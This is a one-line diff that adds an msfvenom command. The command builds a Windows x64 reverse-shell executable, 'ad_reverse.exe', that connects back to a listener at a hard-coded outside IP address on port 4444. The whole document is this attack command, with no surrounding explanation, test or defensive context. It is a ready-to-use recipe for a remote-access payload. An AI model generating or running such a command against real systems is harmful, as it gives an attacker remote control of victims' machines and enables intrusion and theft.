@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=223.205.232.198 LPORT=4444 -f exe > ad_reverse.exe
